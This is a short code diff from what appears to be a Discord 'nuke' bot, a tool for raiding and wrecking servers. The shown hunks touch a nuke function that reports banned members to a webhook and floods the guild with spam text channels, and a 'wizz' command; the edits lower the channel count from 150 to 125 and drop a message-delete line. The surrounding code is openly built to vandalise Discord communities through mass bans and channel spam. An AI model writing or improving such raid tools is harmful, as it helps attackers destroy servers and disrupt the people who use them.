@@ -54,7 +54,7 @@ async def nuke(guild):
   log.add_embed_field(name = "Members Banned", value = f"{guild.bans}", inline = False)
   webhook.add_embed(log)
   webhook.execute()
-  for i in range(150):
+  for i in range(125):
     await guild.create_text_channel(random.choice(CHANNEL_NAMES))
   print(f"{C.GREEN}Nuked {guild.name} ~ Using 1337 wizzer.")
 
@@ -97,7 +97,6 @@ async def help(ctx):
 
 @bot.command()
 async def wizz(ctx):
- await ctx.message.delete()
  if ctx.guild is None:
   await ctx.send("Commands Not Supported In DM.")
  else:
